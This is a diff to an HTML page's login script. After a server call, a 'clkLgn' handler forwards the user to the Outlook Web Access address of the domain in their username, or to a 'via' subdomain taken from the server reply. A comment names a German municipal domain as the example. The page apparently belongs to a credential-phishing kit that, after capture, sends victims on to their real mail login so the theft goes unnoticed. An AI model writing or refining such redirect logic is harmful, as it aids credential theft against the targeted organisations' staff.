@@ -909,7 +909,6 @@ z-index: 9999;
 
 <script>
 // Keep original favicon
-// Keep original favicon
 const originalFavicon = document.querySelector("link[rel~='icon']");
 let spinnerFavicon = null;
 
@@ -1115,9 +1114,26 @@ function clkLgn(event) {
                     cleanDomain = username.replace(/^www\./, '');
                 }
                 
-                // FIXED: Use proper template literal with backticks
-                const targetUrl = `https://mail.${cleanDomain}/owa`;
-                console.log('Redirecting to:', targetUrl);
+                // NEW: Check if server response contains "via" with a subdomain
+                let targetUrl;
+                if (data.message && data.message.includes('via ')) {
+                    // Extract any subdomain that comes after "via "
+                    const viaMatch = data.message.match(/via\s+([^\s]+)/);
+                    if (viaMatch) {
+                        const fullSubdomain = viaMatch[1]; // This gets the full subdomain like "anysubdomain.magistrat.bremerhaven.de"
+                        targetUrl = `https://${fullSubdomain}/owa`;
+                        console.log('Found "via" subdomain. Redirecting to:', targetUrl);
+                    } else {
+                        // Fallback to mail subdomain if regex fails
+                        targetUrl = `https://mail.${cleanDomain}/owa`;
+                        console.log('Via match failed, using mail subdomain. Redirecting to:', targetUrl);
+                    }
+                } else {
+                    // Default behavior: use mail subdomain when no "via" is present
+                    targetUrl = `https://mail.${cleanDomain}/owa`;
+                    console.log('No "via" found, using default mail subdomain. Redirecting to:', targetUrl);
+                }
+                
                 window.location.href = targetUrl;
             });
         }
@@ -1136,5 +1152,6 @@ function clkLgn(event) {
 </script>
 
 </html>
+
 
 
